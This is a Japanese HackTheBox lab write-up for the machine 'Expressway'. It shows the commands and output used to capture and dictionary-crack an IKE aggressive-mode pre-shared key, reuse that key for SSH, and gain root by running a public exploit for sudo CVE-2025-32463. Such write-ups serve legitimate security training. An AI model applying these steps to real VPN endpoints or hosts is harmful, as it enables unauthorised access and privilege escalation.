---
title: 'Expressway - HTB'
description: 'HackTheBox Machine ExpresswayのWriteupです。'
pubDate: 2026-01-16
category: 'HTB'
tags: ['HTB', 'Machine', 'Writeup', 'Linux', 'IKE', 'PSK', 'sudo', 'CVE-2025-32463']
---

# Expressway - HTB

## Enumeration
```bash
> nmap -Pn -T4 <Target-IP>  
PORT   STATE SERVICE
22/tcp open  ssh

> nmap -Pn -T4 <Target-IP> -sU
PORT      STATE         SERVICE
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
363/udp   open|filtered rsvp_tunnel
500/udp   open          isakmp
664/udp   open|filtered secure-aux-bus
4500/udp  open|filtered nat-t-ike
5355/udp  open|filtered llmnr
9103/udp  open|filtered bacula-sd
17939/udp open|filtered unknown
20409/udp open|filtered unknown
21212/udp open|filtered unknown
21318/udp open|filtered unknown
21514/udp open|filtered unknown
21568/udp open|filtered unknown
34079/udp open|filtered unknown
45247/udp open|filtered unknown

> nmap -Pn -T4 <Target-IP> -sU -p 500 -A
PORT    STATE SERVICE VERSION
500/udp open  isakmp?
| ike-version: 
|   attributes: 
|     XAUTH
|_    Dead Peer Detection v1.0
```

## Foothold
### PSKハッシュ値取得
```bash
> ike-scan -M -A <Target-IP>
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
<Target-IP>     Aggressive Mode Handshake returned
        HDR=(CKY-R=889b4eb5bac6f4e1)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        KeyExchange(128 bytes)
        Nonce(32 bytes)
        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
        Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.235 seconds (4.25 hosts/sec).  1 returned handshake; 0 returned notify

> ike-scan -M -A --id=ike@expressway.htb -Ppsk <Target-IP>
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
<Target-IP>     Aggressive Mode Handshake returned
        HDR=(CKY-R=f7b9aa02c2db646a)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        KeyExchange(128 bytes)
        Nonce(32 bytes)
        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
        Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.257 seconds (3.89 hosts/sec).  1 returned handshake; 0 returned notify
```
### Key値取得
```bash
> psk-crack -d /usr/share/wordlists/rockyou.txt psk
Starting psk-crack [ike-scan 1.9.6] (http://www.nta-monitor.com/tools/ike-scan/)
Running in dictionary cracking mode
key "freakingrockstarontheroad" matches SHA1 hash 3128abf2644cbcb3c70a455be7ff4564d4be6bba
Ending psk-crack: 8045040 iterations in 3.532 seconds (2277831.81 iterations/sec)
```

### Keyを使用してSSHアクセス
```bash
# ike@expressway.htbのikeを参考に
ssh ike@<Target-IP> # freakingrockstarontheroad
```

### User
```bash
ike@expressway:~$ ls
user.txt
```

## Privilege Escalation
### sudoの脆弱性 (CVE-2025-32463)
- [linpeas.sh-link](https://github.com/peass-ng/PEASS-ng/releases)
- [CVE-2025-32463-link](https://github.com/MohamedKarrab/CVE-2025-32463)
```bash
# linpeas.shを使用
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
strace Not Found
-rwsr-xr-x 1 root root 1.5M Aug 14 12:58 /usr/sbin/exim4
-rwsr-xr-x 1 root root 1023K Aug 29 15:18 /usr/local/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 116K Aug 26 22:05 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 75K Sep  9 10:09 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 87K Aug 26 22:05 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 91K Sep  9 10:09 /usr/bin/su
-rwsr-xr-x 1 root root 276K Jun 27  2023 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 63K Sep  9 10:09 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 70K Aug 26 22:05 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 52K Aug 26 22:05 /usr/bin/chsh
-rwsr-xr-x 1 root root 19K Sep  9 10:09 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-- 1 root messagebus 51K Mar  8  2025 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 483K Aug 10 00:07 /usr/lib/openssh/ssh-keysign
-r-sr-xr-x 1 root root 14K Aug 28 09:04 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
-r-sr-xr-x 1 root root 15K Aug 28 09:04 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper

ike@expressway:~$ /usr/local/bin/sudo -V
Sudo version 1.9.17
Sudoers policy plugin version 1.9.17
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.17
Sudoers audit plugin version 1.9.17

ike@expressway:~/CVE-2025-32463$ chmod +x get_root.sh
ike@expressway:~/CVE-2025-32463$ ./get_root.sh
[*] Detected architecture: x86_64
[*] Launching sudo with archs-dynamic payload …
```

### Root
```bash
root@expressway:/# ls /root
root.txt
```